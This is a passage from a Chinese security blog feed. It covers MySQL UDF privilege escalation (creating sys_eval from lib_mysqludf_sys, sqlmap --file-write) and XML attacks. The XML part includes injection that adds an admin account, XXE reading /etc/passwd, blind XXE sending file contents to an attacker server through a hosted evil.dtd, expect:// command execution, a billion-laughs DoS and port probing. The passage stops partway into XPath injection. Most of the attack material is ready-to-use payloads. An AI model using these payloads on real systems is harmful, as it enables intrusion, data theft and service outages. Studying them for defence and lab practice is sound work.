等方便。</p><p>udf在<code>mysql&gt;=5.1</code>的版本中，存在于<code>mysql/lib/plugin</code>目录下，文件后缀为.dll，常用c语言编写。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查看secure_file_priv<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>查看插件目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>如果没有，手工创建（mysql5<span class="hljs-number">.1</span>以后基本不可能成功）<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;D:\\env\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation&#x27;</span>;<br>上传dll后，创建自定义函数<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<br>导入成功后查看一下mysql函数里面是否新增了sys_eval函数：<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<br>执行命令<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>删除函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><p>这里注意如果有webshell可以直接上传dll或so文件就直接上传即可</p><p>如果有注入，但是无webshell，可以利用sqlmap，因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u  <span class="hljs-string">&quot;http://localhost:3306/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib_mysqludf_sys_64.so&quot;</span>  --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span>  <br></code></pre></td></tr></table></figure><p>如果没有注入，但可以操作原生sql语句，例如进入phpmyadmin中</p><p>利用16进制into dumpfile写入，具体payload查询：<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">直接 SELECT 查询十六进制写入<br>SELECT  INTO DUMPFILE &#x27;D:<span class="hljs-symbol">\\</span>env<span class="hljs-symbol">\\</span>php<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin<span class="hljs-symbol">\\</span>udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>dll和so文件</p><p>sqlmap中<code>.dll</code>和<code>.so</code>文件的路径：<code>sqlmap/data/udf/mysql</code></p><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具<code>cloak.py</code>来解码使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-variable">$pwd</span><br><span class="hljs-regexp">/mnt/</span>c<span class="hljs-regexp">/Penetration/</span>DatabaseTools<span class="hljs-regexp">/SQLMap/</span>extra/cloak<br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>更多攻击方法参考</strong></p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML漏洞</title>
    <link href="/2023/10/10/XML%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/10/XML%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="XML漏洞"><a href="#XML漏洞" class="headerlink" title="XML漏洞"></a>XML漏洞</h1><h2 id="XML格式"><a href="#XML格式" class="headerlink" title="XML格式"></a>XML格式</h2><blockquote><p>XML被设计用来传输和存储数据，其焦点是数据的内容。</p></blockquote><p>首先了解XML(可扩展标记语言)<br> 基本格式（内部DTD）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;                              &lt;!--xml文件的声明--&gt;<br>&lt;!DOCTYPE note [                                   &lt;!--定义此文档是 note 类型的文档--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;             &lt;!--定义note元素有四个元素--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;                            &lt;!--定义to元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;                          &lt;!--定义from元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;                          &lt;!--定义head元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;                          &lt;!--定义body元素为”#PCDATA”类型--&gt;<br>]&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><p>总的来说</p><p>第一部分：XML声明</p><p>第二部分：文档类型定义DTD   &#x2F;&#x2F;漏洞一般在此出现</p><p>第三部分：文档元素</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><blockquote><p>DTD：用来约束XML文档定义语义约束分类</p></blockquote><h3 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h3><h3 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;<br><br>example:<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br><br></code></pre></td></tr></table></figure><h3 id="公共DTD"><a href="#公共DTD" class="headerlink" title="公共DTD"></a>公共DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p></blockquote><p>按实体有无参分类</p><h3 id="一般实体"><a href="#一般实体" class="headerlink" title="一般实体"></a><strong>一般实体</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>&amp;实体名称;<br></code></pre></td></tr></table></figure><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>%实体名称;<br></code></pre></td></tr></table></figure><p>按实体使用方式分类</p><pre><code class="hljs">1. 内部实体</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>外部实体</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>根据不同语言有以下可支持的协议：</p><p><img src="/img/XML%E6%BC%8F%E6%B4%9E_img/clip_image002-16969084628491.gif" alt="img"></p><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>与sql闭合类似，闭合标签达到更改、添加数据的效果</p><p>前提条件</p><pre><code class="hljs">1. 用户能够控制数据的输入1. 程序有拼凑的数据</code></pre><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>server接收结果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就通过XML注入添加了一个名为<code>hack</code>，密码为<code>hacker</code>的管理员账户。<br> XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><strong>外部引用</strong>可以支持http，file，ftp等协议<br>如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞<br>攻击者可以构造一个XML文档，文档里引用外部实体通过协议进行读取文件等操作<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">一般实体+外部实体<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br><br>参数实体+外部实体<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [  <br>    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>    %file;<br>]&gt;<br></code></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>php中解析xml用的是libxml库</p><p>版本&lt;&#x3D;2.9.0的php中</p><p>simplexml_load_string()函数将正确的XML字符转化为php中的SimpleXMLElement对象</p><p>而&gt;2.9.0的，默认是禁止解析xml外部实体内容的</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts <span class="hljs-comment">#主机名和ip配置文件</span><br><span class="hljs-regexp">/proc/</span>net/arp <span class="hljs-comment">#流量包的信息</span><br><span class="hljs-regexp">/proc/</span>net/tcp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/udp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/dev <span class="hljs-comment">#提供给用户读取或更改网络适配器及统计信息</span><br><span class="hljs-regexp">/proc/</span>net/fib_trie <span class="hljs-comment">#路由缓存</span><br></code></pre></td></tr></table></figure><h3 id="XXE攻击类别及实例"><a href="#XXE攻击类别及实例" class="headerlink" title="XXE攻击类别及实例"></a>XXE攻击类别及实例</h3><ol><li>有回显</li></ol><p>可以用下面的两种方式：</p><ul><li>直接使用外部实体调用<code>file://</code>、<code>php://filter/read=convert.base64-encode/resource=</code>等函数去读取本地文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?</span>xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ul><li>将外部实体引用的 URL 设置到本地服务器，本地构建恶意 dtd 文件，远程注入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;<br>%file;]&gt;<br>&lt;test&gt;&amp;evil;&lt;/test&gt;<br>    <br>//外部dtd内容   <br>&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot; &gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>无回显</li></ol><p>Blind XXE外带，建立dtd文件进行远程协议调用文件</p><p>Blind XXE原理</p><p>先在受害机调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</p><p>再调用<code>evil.dtd</code>中的<code>%file</code>。<code>%file</code>获取受害机上面的敏感文件，然后将<code>%file</code>的返回结果传到<code>%send</code>。</p><p>然后受害机调用<code>%send</code>把读取到的数据发送到远程服务器上。</p><p>假设攻击机ip为：<code>192.168.201.128</code></p><p>vps上部署evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.201.128/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;<br>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;<br>    %dtd;<br>    %send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(apache日志记录)</p><p>攻击机上：<code>tail -f /var/log/apache2/access.log</code></p><h3 id="特殊协议攻击"><a href="#特殊协议攻击" class="headerlink" title="特殊协议攻击"></a>特殊协议攻击</h3><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>条件：在安装expect扩展的PHP环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h4 id="ddos"><a href="#ddos" class="headerlink" title="ddos"></a>ddos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;<br>&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;<br>&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;<br>&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;<br>&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;<br>&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;<br>&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;<br>&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></code></pre></td></tr></table></figure><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;<br>]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h2 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath 查询代码，以获得高权限信息的访问权，类似于SQL注入。</p><p>注入对象是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> ，<code>parameters/input</code>等</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>test.xml(用于存储username和password)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 